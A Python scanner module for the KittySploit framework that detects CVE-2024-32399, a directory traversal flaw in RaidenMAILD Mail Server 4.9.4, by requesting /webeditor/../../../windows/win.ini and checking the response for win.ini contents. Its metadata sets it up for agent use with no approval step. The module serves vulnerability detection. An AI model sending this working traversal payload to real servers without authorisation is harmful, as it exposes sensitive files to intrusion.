#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Directory Traversal vulnerability in RaidenMAILD Mail Server v."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'RaidenMAILD Mail Server v.4.9.4 - Path Traversal Detection',
        'description': 'Directory Traversal vulnerability in RaidenMAILD Mail Server v.4.9.4 and before allows a remote attacker to obtain sensitive information via the /webeditor/ component.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2024', 'lfi', 'raiden', 'mail', 'server', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://owasp.org/www-community/attacks/Path_Traversal',
            'https://github.com/NN0b0dy/CVE-2024-32399/blob/main/README.md',
            'https://github.com/NN0b0dy/c01/blob/main/01.pdf',
            'https://github.com/NN0b0dy/CVE-2024-32399',
            'https://github.com/nomi-sec/PoC-in-GitHub',
        ],
        'cve': 'CVE-2024-32399',
    }

    def run(self):
        r = self.http_request(method="GET", path='/webeditor/../../../windows/win.ini', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('[fonts]', 'for 16-bit app support',)
        header_any = ('application/octet-stream',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='high',
                reason="RaidenMAILD Mail Server v.4.9.4 - Path Traversal detected",
                path='/webeditor/../../../windows/win.ini',
            )
            return True
        return False

